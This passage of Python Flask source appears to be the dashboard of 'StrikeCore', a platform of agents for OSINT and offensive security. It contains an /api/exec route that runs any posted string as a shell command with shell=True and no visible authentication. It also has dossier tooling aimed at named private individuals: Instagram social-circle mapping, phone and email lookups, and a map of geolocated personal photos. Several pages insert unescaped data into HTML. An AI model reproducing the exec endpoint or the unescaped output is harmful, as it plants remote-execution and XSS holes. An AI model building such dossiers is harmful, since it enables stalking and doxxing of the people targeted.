      <p class="text-xs text-gray-500">{usernames} &middot; {tid}</p>
    </div>
    {actions}
    <div class="grid grid-cols-1 lg:grid-cols-2 gap-4">
      <div class="glass-bright p-4"><h2 class="text-sm font-semibold text-blue-400 mb-3">Emails ({len(d.get('emails',{}))})</h2>{email_rows or '<p class="text-gray-600 text-xs">None found</p>'}</div>
      <div class="glass-bright p-4"><h2 class="text-sm font-semibold text-purple-400 mb-3">Phones ({len(d.get('phones',{}))})</h2>{phone_rows or '<p class="text-gray-600 text-xs">None found</p>'}</div>
      <div class="glass-bright p-4"><h2 class="text-sm font-semibold text-green-400 mb-3">Profiles ({len(d.get('profiles',{}))})</h2>{profile_rows or '<p class="text-gray-600 text-xs">None found</p>'}</div>
      <div class="glass-bright p-4"><h2 class="text-sm font-semibold text-pink-400 mb-3">Connections ({len(d.get('social_graph',[]))})</h2>{conn_rows or '<p class="text-gray-600 text-xs">None found</p>'}</div>
    </div>
    {"<div class='glass-bright p-4 mt-4'><h2 class='text-sm font-semibold text-cyan-400 mb-3'>Intelligence Graph</h2><iframe src=/target/"+tid+"/graph style='width:100%;height:500px;border:none;border-radius:8px'></iframe></div>" if has_graph else ""}
    '''

    return _render(name, content, "inv")


@app.route('/agents')
def agents_view():
    """Sub-agent overview with stats and performance."""
    agents_info = [
        {"name": "SocialINT", "file": "socint_agent.py", "icon": "&#128100;", "color": "blue",
         "techniques": "username_hunt, email_intel, phone_intel, social_scrape, breach_check, profile_analysis, face_search, identity_correlation"},
        {"name": "GeoINT", "file": "geoint_agent.py", "icon": "&#127758;", "color": "green",
         "techniques": "ip_geolocation, image_exif, wifi_geolocation, cell_tower_lookup, domain_geo, network_trace, metadata_extraction, address_osint, infrastructure_map"},
        {"name": "Recon", "file": "recon_agent.py", "icon": "&#128269;", "color": "cyan",
         "techniques": "DNS enumeration, subdomain discovery, port scanning, service detection, technology fingerprinting, OSINT correlation"},
        {"name": "WebApp", "file": "webapp_agent.py", "icon": "&#127760;", "color": "yellow",
         "techniques": "technology ID, directory bruteforce, parameter discovery, injection testing, XSS detection, authentication testing, API testing"},
        {"name": "BugBounty", "file": "bugbounty_agent.py", "icon": "&#128176;", "color": "orange",
         "techniques": "scope analysis, asset discovery, subdomain enumeration, content discovery, vulnerability scanning"},
        {"name": "Cloud", "file": "cloud_agent.py", "icon": "&#9729;", "color": "purple",
         "techniques": "credential validation, IAM analysis, resource enumeration, misconfiguration scanning, secret detection, container security"},
        {"name": "Binary", "file": "binary_agent.py", "icon": "&#128187;", "color": "red",
         "techniques": "file identification, protection analysis, static analysis, dynamic analysis, vulnerability identification, exploit development"},
        {"name": "CTF", "file": "ctf_agent.py", "icon": "&#127937;", "color": "pink",
         "techniques": "category detection, tool selection, automated solving, hint generation"},
        {"name": "OSINT", "file": "osint_agent.py", "icon": "&#128373;", "color": "teal",
         "techniques": "target profiling, email harvesting, social media enumeration, domain intelligence, breach checking, cross-source correlation"},
    ]

    cards = ""
    for a in agents_info:
        exists = Path(f"/home/mariello/strikecore/agents/{a['file']}").exists()
        status_dot = "bg-green-500" if exists else "bg-red-500"
        cards += f'''
        <div class="glass-bright p-4 hover:border-{a['color']}-500/30 transition-colors">
          <div class="flex items-center justify-between mb-2">
            <div class="flex items-center gap-2">
              <span class="text-lg">{a['icon']}</span>
              <span class="text-white font-semibold text-sm">{a['name']}</span>
            </div>
            <div class="w-2 h-2 rounded-full {status_dot}"></div>
          </div>
          <div class="text-[10px] text-gray-500 mb-2">{a['file']}</div>
          <div class="text-[10px] text-gray-400 leading-relaxed">{a['techniques'][:120]}...</div>
        </div>'''

    content = f'''
    <h1 class="text-xl font-bold text-white mb-6">Sub-Agents</h1>
    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">{cards}</div>
    '''

    return _render("Agents", content, "agents")


@app.route('/hephaestus')
def hephaestus_view():
    """Read-only Hephaestus toolsmith view — reads run-record JSON directly.

    Run-record fields (LLM-generated rationale/reason, discovery-derived
    candidate names) are HTML-escaped before interpolation: this page is
    reachable over the network tunnel, so reflected free text must not be
    trusted as markup.
    """
    from markupsafe import escape as _esc

    def _e(value) -> str:
        return str(_esc(str(value)))

    runs = []
    if _HEPH_RUNS_DIR.is_dir():
        files = sorted(_HEPH_RUNS_DIR.glob("*.json"),
                       key=lambda p: p.stat().st_mtime, reverse=True)[:20]
        for f in files:
            try:
                runs.append(json.loads(f.read_text(encoding="utf-8")))
            except Exception:
                continue

    pending = [(r["run_id"], p) for r in runs for p in r.get("pending_approvals", [])]

    pending_html = ""
    if pending:
        rows = ""
        for rid, p in pending:
            gate, rid_e = _e(p["gate"]), _e(rid)
            rows += (f'<div class="glass-bright p-3 mb-2 border border-yellow-500/30">'
                     f'<span class="text-yellow-400 font-mono text-xs">{gate}</span> '
                     f'<span class="text-gray-300 text-xs">on {rid_e} — {_e(p.get("reason",""))}</span>'
                     f'<div class="text-[10px] text-gray-500 mt-1">clear with: '
                     f'<span class="text-cyan-400">hephaestus approve {rid_e} {gate}</span></div></div>')
        pending_html = (f'<h2 class="text-sm font-semibold text-yellow-400 mb-2">'
                        f'Pending sandbox gates ({len(pending)})</h2>{rows}')

    if not runs:
        body = ('<div class="glass-bright p-6 text-gray-400 text-sm">'
                'No Hephaestus runs yet. Start one from the console: '
                '<span class="text-cyan-400">hephaestus run --focus &lt;category&gt;</span>.</div>')
    else:
        cards = ""
        for r in runs:
            t = r.get("totals", {})
            usd = f"${t.get('cost_usd_micros', 0) / 1_000_000:.4f}"
            decs = "".join(
                f'<div class="text-[10px] text-gray-400">{_e(d.get("action",""))} '
                f'<span class="text-gray-300">{_e(d.get("candidate",""))}</span> — {_e(d.get("rationale",""))}</div>'
                for d in r.get("decisions", []))
            cards += (
                f'<div class="glass-bright p-4 mb-3">'
                f'<div class="flex items-center justify-between mb-1">'
                f'<span class="text-white font-semibold text-sm">{_e(r["run_id"])}</span>'
                f'<span class="text-[10px] text-gray-500">{_e(r.get("started_at",""))}</span></div>'
                f'<div class="text-[10px] text-gray-400 mb-2">'
                f'status <span class="text-gray-200">{_e(r.get("status",""))}</span> · '
                f'focus <span class="text-gray-200">{_e(r.get("params",{}).get("focus_category",""))}</span> · '
                f'candidates {len(r.get("candidates",[]))} · cost {usd}</div>{decs}</div>')
        body = f'<div class="grid grid-cols-1 lg:grid-cols-2 gap-4"><div>{pending_html}</div><div>{cards}</div></div>'

    content = f'''
    <h1 class="text-xl font-bold text-white mb-1">Hephaestus — Toolsmith</h1>
    <p class="text-xs text-gray-500 mb-6">Native R&amp;D agent · run records read-only · approvals via console/CLI</p>
    {body}
    '''
    return _render("Hephaestus", content, "hephaestus")


@app.route('/api/control-room/state')
def api_control_room_state():
    """Live aggregates + recent/active agent runs (shared core.agent_events bus)."""
    try:
        from core import agent_events
        return jsonify(agent_events.control_room_state(80))
    except Exception as exc:  # noqa: BLE001
        return jsonify({"aggregates": {}, "runs": [], "error": str(exc)})


@app.route('/api/control-room/run/<run_id>')
def api_control_room_run(run_id):
    """Drill-down timeline for one run."""
    try:
        from core import agent_events
        return jsonify(agent_events.run_detail(run_id))
    except Exception as exc:  # noqa: BLE001
        return jsonify({"run": {"run_id": run_id, "missing": True},
                        "timeline": [], "error": str(exc)})


@app.route('/control-room')
def control_room():
    """htop-style live control room — polls /api/control-room/* every 2s."""
    content = '''
    <h1 class="text-xl font-bold text-white mb-1">Control Room</h1>
    <p class="text-xs text-gray-500 mb-4">Live agent activity &amp; metrics · auto-refresh 2s ·
       deep drill-down on Hephaestus (research &rarr; gaps &rarr; fixes &rarr; gates)</p>

    <div id="metrics" class="grid grid-cols-2 lg:grid-cols-6 gap-3 mb-5"></div>

    <div class="grid grid-cols-1 lg:grid-cols-3 gap-4">
      <div class="lg:col-span-2 glass-bright p-3 overflow-auto">
        <table class="w-full text-xs" id="runs-tbl">
          <thead class="text-gray-400 border-b border-white/10">
            <tr><th class="text-left py-1">run</th><th class="text-left">agent</th>
            <th class="text-left">surface</th><th class="text-left">status</th>
            <th class="text-left">phase</th><th class="text-right">elapsed</th>
            <th class="text-right">calls</th><th class="text-right">cost</th>
            <th class="text-right">gates</th></tr></thead>
          <tbody id="runs-body"></tbody>
        </table>
      </div>
      <div class="glass-bright p-3 overflow-auto" id="detail">
        <div class="text-gray-500 text-xs">Select a run for details.</div>
      </div>
    </div>

    <script>
    var SEL = null;
    var SCOL = {running:'text-green-400',paused:'text-yellow-400',completed:'text-cyan-400',
                error:'text-red-400',failed:'text-red-400',stale:'text-fuchsia-400',cancelled:'text-gray-500'};
    function usd(m){return '$'+((m||0)/1e6).toFixed(4);}
    function el(s){s=Math.floor(s||0);return String(Math.floor(s/60)).padStart(2,'0')+':'+String(s%60).padStart(2,'0');}
    function metric(label,val,cls){return '<div class="glass p-2"><div class="text-[10px] text-gray-400">'+label+
        '</div><div class="text-lg font-bold '+(cls||'text-white')+'">'+val+'</div></div>';}
    function poll(){
      fetch('/api/control-room/state').then(function(r){return r.json();}).then(function(d){
        var a=d.aggregates||{};
        document.getElementById('metrics').innerHTML =
          metric('Active agents',a.active_agents||0,'text-green-400')+
          metric('Runs',a.total_runs||0)+metric('LLM calls',a.llm_calls||0)+
          metric('Calls/min',a.calls_per_min||0,'text-cyan-400')+
          metric('Cost',usd(a.cost_micros),'text-yellow-400')+
          metric('Pending gates',a.pending_gates||0,(a.pending_gates?'text-red-400':'text-white'));
        var rows='';
        (d.runs||[]).forEach(function(r){
          var st=r.effective_status||'?';
          rows+='<tr class="border-b border-white/5 cursor-pointer hover:bg-white/5" onclick="sel(\\''+r.run_id+'\\')">'+
            '<td class="py-1 font-mono">'+r.run_id.substring(0,8)+'</td><td>'+r.agent+'</td>'+
            '<td class="text-gray-400">'+(r.surface||'')+'</td>'+
            '<td class="'+(SCOL[st]||'')+'">'+st+'</td><td class="text-gray-300">'+(r.phase||'')+'</td>'+
            '<td class="text-right text-gray-400">'+el(r.elapsed_seconds)+'</td>'+
            '<td class="text-right">'+(r.calls||0)+'</td><td class="text-right text-yellow-400">'+usd(r.cost_micros)+'</td>'+
            '<td class="text-right '+(r.pending_gate_count?'text-red-400':'text-gray-500')+'">'+(r.pending_gate_count||0)+'</td></tr>';
        });
        document.getElementById('runs-body').innerHTML = rows || '<tr><td colspan="9" class="text-gray-500 py-3">No agent runs yet.</td></tr>';
        if(SEL) detail(SEL);
      }).catch(function(){});
    }
    function sel(id){SEL=id;detail(id);}
    function detail(id){
      fetch('/api/control-room/run/'+id).then(function(r){return r.json();}).then(function(d){
        var run=d.run||{};var st=run.effective_status||'?';
        var h='<div class="text-sm font-bold text-white mb-1">'+(run.agent||'?')+
          ' <span class="text-gray-500 text-[10px]">['+(run.surface||'')+']</span> '+
          '<span class="'+(SCOL[st]||'')+'">'+st+'</span></div>'+
          '<div class="text-[10px] text-gray-400 mb-2">'+el(run.elapsed_seconds)+' · '+(run.calls||0)+
          ' call(s) · <span class="text-yellow-400">'+usd(run.cost_micros)+'</span></div>';
        if((run.pending_gates||[]).length) h+='<div class="text-[10px] text-red-400 mb-2">PENDING GATES: '+run.pending_gates.join(', ')+'</div>';
        h+='<div class="text-[10px] text-gray-500 uppercase mb-1">timeline</div>';
        (d.timeline||[]).slice(-40).forEach(function(e){
          var det=e.detail||'';
          if(e.event_type==='llm_call') det=(e.model||'')+'  '+usd(e.cost_micros);
          h+='<div class="text-[10px] mb-0.5"><span class="text-gray-500">'+String(e.ts||'').substring(11,19)+
             '</span> <span class="text-cyan-400">'+e.event_type+'</span> <span class="text-gray-300">'+
             String(det).substring(0,90)+'</span></div>';
        });
        document.getElementById('detail').innerHTML=h;
      }).catch(function(){});
    }
    poll(); setInterval(poll, 2000);
    </script>
    '''
    return _render("Control Room", content, "control_room")


@app.route('/infrastructure')
def infrastructure():
    """Infrastructure health — services, tools, containers, performance."""
    # Tools check
    tools_data = []
    all_tools = ["sherlock", "maigret", "holehe", "h8mail", "phoneinfoga", "blackbird",
                 "nexfil", "exiftool", "nmap", "subfinder", "httpx", "nuclei",
                 "socialscan", "mosint", "gallery-dl", "yt-dlp", "theHarvester",
                 "sqlmap", "nikto", "gobuster", "ffuf", "katana", "shodan", "censys",
                 "crosslinked", "truecallerjs", "whois", "dig", "curl", "jq",
                 "tor", "proxychains4", "docker"]
    for tool in all_tools:
        found = shutil.which(tool) is not None
        tools_data.append({"name": tool, "ok": found})

    tools_ok = sum(1 for t in tools_data if t["ok"])
    tools_total = len(tools_data)

    tool_rows = ""
    for t in tools_data:
        color = "green" if t["ok"] else "red"
        tool_rows += f'<div class="flex items-center justify-between py-1 px-2 text-[11px]"><span class="text-gray-300">{t["name"]}</span><span class="text-{color}-400">{"OK" if t["ok"] else "MISS"}</span></div>'

    # Docker containers
    docker_rows = ""
    try:
        r = subprocess.run(["docker", "ps", "--format", "{{.Names}}\t{{.Status}}\t{{.Image}}"],
                          capture_output=True, text=True, timeout=5)
        for line in r.stdout.strip().split("\n"):
            if not line.strip():
                continue
            parts = line.split("\t")
            name = parts[0] if parts else ""
            status = parts[1] if len(parts) > 1 else ""
            image = parts[2] if len(parts) > 2 else ""
            is_up = "Up" in status
            docker_rows += f'''<div class="flex items-center justify-between py-1.5 px-3 border-b border-white/5 text-[11px]">
              <div class="flex items-center gap-2"><div class="w-1.5 h-1.5 rounded-full {"bg-green-500" if is_up else "bg-red-500"}"></div><span class="text-gray-300">{name}</span></div>
              <span class="text-gray-500">{image[:40]}</span>
              <span class="text-{"green" if is_up else "red"}-400">{status[:20]}</span>
            </div>'''
    except:
        docker_rows = '<p class="text-gray-600 text-xs p-3">Docker not available</p>'

    # System metrics
    try:
        cpu = psutil.cpu_percent(interval=0.5)
        mem = psutil.virtual_memory()
        disk = shutil.disk_usage("/")
        net = psutil.net_io_counters()
        load = os.getloadavg()
    except:
        cpu = mem = disk = net = load = None

    # Tool performance
    perf_rows = ""
    if PERF_FILE.exists():
        try:
            perf = json.loads(PERF_FILE.read_text())
            sorted_perf = sorted(
                [(k, v) for k, v in perf.items() if not k.startswith("_")],
                key=lambda x: x[1].get("total_calls", 0), reverse=True
            )
            for tool, stats in sorted_perf[:20]:
                rate = stats.get("lifetime_success_rate", 0)
                color = "green" if rate >= 0.75 else ("yellow" if rate >= 0.5 else "red")
                perf_rows += f'''<tr class="table-row border-b border-white/5 text-[11px]">
                  <td class="py-1 px-3 text-gray-300">{tool}</td>
                  <td class="py-1 px-3 text-center">{stats.get("total_calls",0)}</td>
                  <td class="py-1 px-3 text-center">{stats.get("sessions_used",0)}</td>
                  <td class="py-1 px-3 text-center text-{color}-400">{rate*100:.0f}%</td>
                </tr>'''
        except:
            pass

    content = f'''
    <h1 class="text-xl font-bold text-white mb-6">Infrastructure</h1>

    <!-- System Metrics -->
    <div class="grid grid-cols-2 md:grid-cols-4 gap-3 mb-6">
      <div class="glass p-3"><div class="text-[10px] text-gray-400 mb-1">CPU</div><div class="stat-num text-cyan-400" style="font-size:1.5rem">{cpu:.0f}%</div><div class="text-[10px] text-gray-500">Load: {load[0]:.1f} {load[1]:.1f} {load[2]:.1f}</div></div>
      <div class="glass p-3"><div class="text-[10px] text-gray-400 mb-1">Memory</div><div class="stat-num text-purple-400" style="font-size:1.5rem">{mem.percent:.0f}%</div><div class="text-[10px] text-gray-500">{mem.used/1024**3:.1f}G / {mem.total/1024**3:.0f}G</div></div>
      <div class="glass p-3"><div class="text-[10px] text-gray-400 mb-1">Disk</div><div class="stat-num text-yellow-400" style="font-size:1.5rem">{disk.used/disk.total*100:.0f}%</div><div class="text-[10px] text-gray-500">{disk.free/1024**3:.0f}G free</div></div>
      <div class="glass p-3"><div class="text-[10px] text-gray-400 mb-1">Network</div><div class="stat-num text-green-400" style="font-size:1.5rem">{net.bytes_sent/1024**3:.1f}G</div><div class="text-[10px] text-gray-500">sent / {net.bytes_recv/1024**3:.1f}G recv</div></div>
    </div>

    <div class="grid grid-cols-1 lg:grid-cols-2 gap-4 mb-6">
      <!-- Tools Health -->
      <div class="glass-bright p-4">
        <h2 class="text-sm font-semibold text-cyan-400 mb-2">Tools ({tools_ok}/{tools_total})</h2>
        <div class="max-h-64 overflow-y-auto">{tool_rows}</div>
      </div>
      <!-- Docker Containers -->
      <div class="glass-bright p-4">
        <h2 class="text-sm font-semibold text-blue-400 mb-2">Services (Docker)</h2>
        <div class="max-h-64 overflow-y-auto">{docker_rows}</div>
      </div>
    </div>

    {"<div class='glass-bright p-4'><h2 class='text-sm font-semibold text-yellow-400 mb-2'>Tool Performance (Lifetime)</h2><table class='w-full text-xs'><thead><tr class='text-gray-500 border-b border-white/10'><th class='text-left py-1 px-3'>Tool</th><th class='py-1 px-3'>Calls</th><th class='py-1 px-3'>Sessions</th><th class='py-1 px-3'>Rate</th></tr></thead><tbody>" + perf_rows + "</tbody></table></div>" if perf_rows else ""}
    ''' if cpu is not None else '<p class="text-gray-500">System metrics unavailable</p>'

    return _render("Infrastructure", content, "infra")


@app.route('/tasks')
def tasks_view():
    """Task dispatch interface — send commands to StrikeCore."""
    content = '''
    <h1 class="text-xl font-bold text-white mb-6">Task Dispatch</h1>

    <div class="glass-bright p-5 mb-6" x-data="{cmd:'', running:false, output:''}">
      <h2 class="text-sm font-semibold text-red-400 mb-3">Execute Command</h2>
      <div class="flex gap-2">
        <input x-model="cmd" type="text" placeholder="dossier Mario Rossi instagram.com/mariorossi"
          class="flex-1 bg-black/30 border border-white/10 rounded-lg px-3 py-2 text-xs text-white placeholder-gray-600 focus:border-cyan-500/50 focus:outline-none">
        <button @click="running=true; fetch('/api/exec',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cmd:cmd})}).then(r=>r.json()).then(d=>{output=d.output;running=false})"
          class="px-4 py-2 bg-red-500/20 border border-red-500/30 rounded-lg text-red-400 text-xs hover:bg-red-500/30" :disabled="running">
          <span x-show="!running">Execute</span><span x-show="running" class="pulse">Running...</span>
        </button>
      </div>
      <div x-show="output" class="mt-3 bg-black/40 rounded-lg p-3 max-h-64 overflow-y-auto">
        <pre class="text-[10px] text-green-300 whitespace-pre-wrap" x-text="output"></pre>
      </div>
    </div>

    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
      <div class="glass p-4 hover:border-cyan-500/20 cursor-pointer" onclick="document.querySelector('input').value='dossier ';document.querySelector('input').focus()">
        <div class="text-cyan-400 text-sm font-medium mb-1">Dossier</div>
        <div class="text-[10px] text-gray-500">Full OSINT investigation on a person</div>
      </div>
      <div class="glass p-4 hover:border-green-500/20 cursor-pointer" onclick="document.querySelector('input').value='ig-social-circle ';document.querySelector('input').focus()">
        <div class="text-green-400 text-sm font-medium mb-1">Social Circle</div>
        <div class="text-[10px] text-gray-500">Map Instagram connections</div>
      </div>
      <div class="glass p-4 hover:border-purple-500/20 cursor-pointer" onclick="document.querySelector('input').value='sherlock ';document.querySelector('input').focus()">
        <div class="text-purple-400 text-sm font-medium mb-1">Username Hunt</div>
        <div class="text-[10px] text-gray-500">Search username across 400+ platforms</div>
      </div>
      <div class="glass p-4 hover:border-blue-500/20 cursor-pointer" onclick="document.querySelector('input').value='sc-holehe ';document.querySelector('input').focus()">
        <div class="text-blue-400 text-sm font-medium mb-1">Email Check</div>
        <div class="text-[10px] text-gray-500">Check email registrations</div>
      </div>
      <div class="glass p-4 hover:border-yellow-500/20 cursor-pointer" onclick="document.querySelector('input').value='wa-check +39';document.querySelector('input').focus()">
        <div class="text-yellow-400 text-sm font-medium mb-1">Phone Lookup</div>
        <div class="text-[10px] text-gray-500">Validate phone + carrier info</div>
      </div>
      <div class="glass p-4 hover:border-red-500/20 cursor-pointer" onclick="document.querySelector('input').value='ig-auth-lookup ';document.querySelector('input').focus()">
        <div class="text-red-400 text-sm font-medium mb-1">Instagram Deep</div>
        <div class="text-[10px] text-gray-500">Authenticated Instagram OSINT</div>
      </div>
    </div>
    '''

    return _render("Tasks", content, "tasks")


@app.route('/api/exec', methods=['POST'])
def api_exec():
    """Execute a command and return output (for task dispatch)."""
    data = request.get_json() or {}
    cmd = data.get("cmd", "").strip()
    if not cmd:
        return jsonify({"error": "No command", "output": ""}), 400

    try:
        r = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=120,
            env={**os.environ, "PATH": os.environ.get("PATH", "")},
            stdin=subprocess.DEVNULL,
        )
        output = r.stdout
        if r.stderr:
            output += "\n[STDERR] " + r.stderr
        return jsonify({"output": output[:5000], "exit_code": r.returncode})
    except subprocess.TimeoutExpired:
        return jsonify({"output": "Command timed out (120s)", "exit_code": -1})
    except Exception as e:
        return jsonify({"output": str(e), "exit_code": -1})


# ── Existing routes (kept) ──

@app.route('/target/<tid>/graph')
def target_graph(tid):
    p = GRAPHS_DIR / f"{tid}_graph.html"
    return send_file(str(p)) if p.exists() else abort(404)

@app.route('/target/<tid>/report')
def target_report(tid):
    p = REPORTS_DIR / f"{tid}_report.html"
    return send_file(str(p)) if p.exists() else abort(404)

@app.route('/target/<tid>/manage')
def manage_target(tid):
    import sqlite3
    db_path = str(Path.home() / "strikecore-data" / "strikecore.db")
    if not Path(db_path).exists():
        return _render("Manage", '<p class="text-gray-500">No database found</p>', "inv")
    conn = sqlite3.connect(db_path)
    conn.row_factory = sqlite3.Row
    emails = conn.execute("SELECT * FROM emails WHERE target_id=? ORDER BY confidence DESC", (tid,)).fetchall()
    phones = conn.execute("SELECT * FROM phones WHERE target_id=? ORDER BY confidence DESC", (tid,)).fetchall()
    profiles = conn.execute("SELECT * FROM profiles WHERE target_id=?", (tid,)).fetchall()
    conn.close()

    def tbl(title, rows, cols, color):
        if not rows:
            return f'<div class="glass-bright p-4 mb-4"><h2 class="text-sm font-semibold text-{color}-400">{title} (0)</h2><p class="text-gray-600 text-xs mt-2">Empty</p></div>'
        h = f'<div class="glass-bright p-4 mb-4"><h2 class="text-sm font-semibold text-{color}-400 mb-2">{title} ({len(rows)})</h2><table class="w-full text-[11px]"><thead><tr class="text-gray-500 border-b border-white/10">'
        for c in cols:
            h += f'<th class="text-left py-1 px-2">{c}</th>'
        h += '<th></th></tr></thead><tbody>'
        for r in rows:
            h += '<tr class="table-row border-b border-white/5">'
            for c in cols:
                h += f'<td class="py-1 px-2 text-gray-300">{r[c] or ""}</td>'
            h += f'<td class="py-1 px-2"><a href="/delete/{title.lower()}/{r["id"]}?target={tid}" class="text-red-500 hover:text-red-300" onclick="return confirm(\'Delete?\')">&#10005;</a></td></tr>'
        h += '</tbody></table></div>'
        return h

    body = tbl("emails", emails, ["id", "email", "confidence", "sources"], "blue")
    body += tbl("phones", phones, ["id", "phone", "confidence", "carrier", "sources"], "purple")
    body += tbl("profiles", profiles, ["id", "platform", "url", "confidence"], "green")
    body += f'''<div class="glass p-4 border-red-500/20 glow-red">
      <h2 class="text-sm font-semibold text-red-400">Danger Zone</h2>
      <a href="/target/{tid}/reset" onclick="return confirm('DELETE ALL data for {tid}?')"
         class="inline-block mt-2 px-3 py-1.5 bg-red-500/20 border border-red-500/30 rounded text-red-400 text-xs hover:bg-red-500/30">Reset Investigation</a>
    </div>'''

    return _render(f"Manage: {tid}", f'<h1 class="text-xl font-bold text-white mb-6">Manage: {tid}</h1>{body}', "inv")

@app.route('/delete/<table>/<int:row_id>')
def delete_row(table, row_id):
    from flask import redirect
    allowed = {"emails", "phones", "profiles", "organizations", "connections", "evidence", "documents", "phase_log"}
    if table not in allowed:
        abort(400)
    import sqlite3
    conn = sqlite3.connect(str(Path.home() / "strikecore-data" / "strikecore.db"))
    conn.execute("DELETE FROM %s WHERE id=?" % table, (row_id,))
    conn.commit()
    conn.close()
    return redirect("/target/%s/manage" % request.args.get("target", ""))

@app.route('/target/<tid>/reset')
def reset_target(tid):
    from flask import redirect
    import sqlite3
    db_path = str(Path.home() / "strikecore-data" / "strikecore.db")
    if Path(db_path).exists():
        conn = sqlite3.connect(db_path)
        for t in ["emails", "phones", "profiles", "organizations", "locations", "connections", "evidence", "documents", "phase_log"]:
            conn.execute("DELETE FROM %s WHERE target_id=?" % t, (tid,))
        conn.commit()
        conn.close()
    jp = STORE_DIR / f"{tid}.json"
    if jp.exists():
        jp.unlink()
    return redirect("/investigations")


@app.route('/target/<tid>/map')
def target_map(tid):
    """Unified GeoMap: investigation locations + geolocated social photos with popup details."""
    store = InvestigationStore(tid)
    d = store.data
    name = (d["identity"]["names"] or [tid])[0]

    # Location markers from investigation store (geocode by name)
    loc_markers = []
    for l in d.get("locations", []):
        loc_markers.append({
            "name": l["name"] if isinstance(l, dict) else l,
            "source": l.get("source", "") if isinstance(l, dict) else "",
            "confidence": l.get("confidence", "PROBABLE") if isinstance(l, dict) else "PROBABLE",
            "type": "location",
        })

    # Photo markers from ig_photo_mapper (already have GPS)
    photo_markers = []
    photos_file = Path.home() / "strikecore-data" / "photos" / tid / "photo_markers.json"
    if photos_file.exists():
        try:
            all_photos = json.loads(photos_file.read_text())
            for m in all_photos:
                if m.get("lat") and m.get("lon"):
                    photo_markers.append(m)
        except:
            pass

    loc_json = json.dumps(loc_markers)
    photo_json = json.dumps(photo_markers)
    total_photos = len(photo_markers)
    total_locs = len(loc_markers)

    return Response('''<!DOCTYPE html><html><head><meta charset="utf-8">
<title>GeoMap: ''' + name + '''</title>
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<style>
body{margin:0;background:#050510;font-family:"JetBrains Mono",monospace;color:#ccc}
#map{height:calc(100vh - 50px);width:100%}
.hbar{height:50px;background:rgba(15,15,35,0.95);border-bottom:1px solid rgba(255,50,50,0.3);
  display:flex;align-items:center;padding:0 20px;gap:15px;backdrop-filter:blur(10px)}
.hbar h1{color:#ff3333;font-size:14px;margin:0}
.hbar .st{color:#666;font-size:10px}
.hbar a{color:#888;font-size:11px;text-decoration:none}
.hbar .badge{padding:2px 8px;border-radius:9999px;font-size:9px;font-weight:600}
.photo-popup{max-width:300px;font-family:"JetBrains Mono",monospace}
.photo-popup img{width:100%;border-radius:8px;margin-bottom:8px;max-height:200px;object-fit:cover}
.photo-popup .loc{color:#00cccc;font-weight:bold;font-size:12px;margin-bottom:4px}
.photo-popup .date{color:#888;font-size:10px}
.photo-popup .geo-src{display:inline-block;padding:1px 6px;border-radius:4px;font-size:9px;font-weight:600;margin-left:6px}
.photo-popup .geo-exif{background:rgba(51,153,255,0.2);color:#3399ff}
.photo-popup .geo-tag{background:rgba(0,204,102,0.2);color:#00cc66}
.photo-popup .tagged{color:#ff6699;font-size:10px;margin-top:4px}
.photo-popup .caption{color:#999;font-size:10px;margin-top:4px;font-style:italic;border-left:2px solid #333;padding-left:6px}
.photo-popup .coords{color:#555;font-size:9px;margin-top:4px}
.loc-popup{font-family:"JetBrains Mono",monospace;max-width:250px}
.loc-popup .name{color:#ffcc00;font-weight:bold;font-size:12px}
.loc-popup .src{color:#888;font-size:10px}
.legend{background:rgba(10,10,26,0.95);padding:10px 14px;border-radius:8px;border:1px solid rgba(255,255,255,0.1);
  font-size:10px;backdrop-filter:blur(10px)}
.legend b{color:#fff;font-size:11px}
.legend div{margin:3px 0;display:flex;align-items:center;gap:6px}
.legend span{display:inline-block;width:12px;height:12px;border-radius:50%;border:2px solid rgba(255,255,255,0.3)}
</style></head><body>
<div class="hbar">
  <a href="/target/''' + tid + '''">&#8592;</a>
  <h1>&#127758; GeoMap</h1>
  <span class="st">''' + name + '''</span>
  <span class="badge" style="background:rgba(0,204,102,0.2);color:#00cc66">''' + str(total_photos) + ''' photos</span>
  <span class="badge" style="background:rgba(255,204,0,0.2);color:#ffcc00">''' + str(total_locs) + ''' locations</span>
</div>
<div id="map"></div>
<script>
var map = L.map('map').setView([41.9, 12.5], 5);
L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {maxZoom:19}).addTo(map);

var bounds = [];

// ── Photo markers (have GPS already) ──
var photos = ''' + photo_json + ''';

photos.forEach(function(m) {
  var isExif = m.geo_source === 'EXIF';
  var color = isExif ? '#3399ff' : '#00cc66';
  var srcClass = isExif ? 'geo-exif' : 'geo-tag';
  var srcLabel = isExif ? 'EXIF' : 'GEOTAG';

  var icon = L.divIcon({
    html: '<div style="position:relative"><div style="background:'+color+';width:16px;height:16px;border-radius:50%;border:2px solid #fff;box-shadow:0 0 10px '+color+'40"></div><div style="position:absolute;top:-2px;left:-2px;width:20px;height:20px;border-radius:50%;border:1px solid '+color+'40;animation:pulse 2s infinite"></div></div>',
    className: '', iconSize: [16, 16], iconAnchor: [8, 8]
  });

  var popup = '<div class="photo-popup">';
  if (m.thumb_url) popup += '<img src="' + m.thumb_url + '" onerror="this.style.display=\\'none\\'">';
  popup += '<div class="loc">' + (m.location_name || 'Unknown location') + '</div>';
  popup += '<div class="date">' + m.date + '<span class="geo-src ' + srcClass + '">' + srcLabel + '</span></div>';
  if (m.tagged && m.tagged.length > 0) popup += '<div class="tagged">&#128101; ' + m.tagged.join(', ') + '</div>';
  if (m.caption) popup += '<div class="caption">' + m.caption.substring(0, 120) + '</div>';
  popup += '<div class="coords">' + parseFloat(m.lat).toFixed(4) + ', ' + parseFloat(m.lon).toFixed(4) + '</div>';
  popup += '</div>';

  L.marker([m.lat, m.lon], {icon: icon}).addTo(map).bindPopup(popup, {maxWidth: 320});
  bounds.push([m.lat, m.lon]);
});

// ── Location markers (need geocoding) ──
var locs = ''' + loc_json + ''';

locs.forEach(function(m) {
  fetch('https://nominatim.openstreetmap.org/search?q=' + encodeURIComponent(m.name) + '&format=json&limit=1')
  .then(function(r) { return r.json(); })
  .then(function(d) {
    if (d.length > 0) {
      var lat = parseFloat(d[0].lat);
      var lon = parseFloat(d[0].lon);
      var icon = L.divIcon({
